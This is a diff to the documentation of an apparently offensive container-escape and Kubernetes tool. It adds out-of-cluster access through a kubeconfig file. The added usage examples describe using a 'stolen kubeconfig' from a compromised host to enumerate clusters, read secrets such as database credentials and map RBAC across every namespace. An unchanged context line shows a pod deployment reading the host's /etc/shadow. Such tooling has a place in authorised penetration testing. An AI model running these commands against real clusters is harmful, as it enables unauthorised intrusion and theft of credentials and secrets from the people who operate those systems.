@@ -19,6 +19,7 @@ Container escape and Kubernetes operations — enumerate and exploit breakout ve
 | command | No | — | Command to execute, secret name, or 'podname command' for k8s-exec |
 | image | No | alpine | Container image for docker-sock/k8s-deploy/k8s-exec |
 | path | No | auto-detect | Block device path for mount-host; namespace override for K8s actions (`k8s-rbac` accepts `<ns>`, `<ns1,ns2,...>`, or `*` for every namespace) |
+| kubeconfig | No | — | Path to kubeconfig file for out-of-cluster K8s access. Supports bearer token and client certificate auth. If empty, uses in-cluster service account |
 
 ### Actions
 
@@ -110,7 +111,29 @@ container-escape -action k8s-deploy -command "cat /hostfs/etc/shadow" -image alp
 container-escape -action k8s-exec -command "nginx-pod-abc123 id"
 ```
 
-K8s operations require a service account token (auto-detected from `/var/run/secrets/kubernetes.io/serviceaccount/`). All API calls use the service account's RBAC permissions. Use `k8s-enum` first to assess available access; `k8s-rbac` then maps the privilege landscape and `k8s-nodes` identifies the underlying hosts.
+K8s operations use either in-cluster service account auth (auto-detected from `/var/run/secrets/kubernetes.io/serviceaccount/`) or an explicit kubeconfig file via `-kubeconfig`. All API calls use the authenticated identity's RBAC permissions. Use `k8s-enum` first to assess available access; `k8s-rbac` then maps the privilege landscape and `k8s-nodes` identifies the underlying hosts.
+
+### Out-of-Cluster Access (kubeconfig)
+
+When running outside a Kubernetes cluster (e.g., on a compromised Linux host with a stolen `~/.kube/config`), use the `-kubeconfig` flag to access the K8s API remotely:
+
+```
+# Use a stolen kubeconfig for K8s enumeration
+container-escape -action k8s-enum -kubeconfig /home/user/.kube/config
+
+# Read secrets using a kubeconfig with admin access
+container-escape -action k8s-secrets -command database-creds -kubeconfig /tmp/stolen-kubeconfig
+
+# Scan RBAC across all namespaces
+container-escape -action k8s-rbac -path "*" -kubeconfig /home/user/.kube/config
+```
+
+Supported kubeconfig authentication modes:
+- **Bearer token** — most common for service account tokens
+- **Client certificate** — mTLS with inline base64 or file-referenced PEM certs
+- **CA verification** — inline base64 or file-referenced CA certs; `insecure-skip-tls-verify` honored
+
+Not supported: `exec`-based auth (e.g., `aws eks get-token`). Extract the token manually and set it in the kubeconfig's `user.token` field.
 
 ### Example Output (k8s-rbac)
 
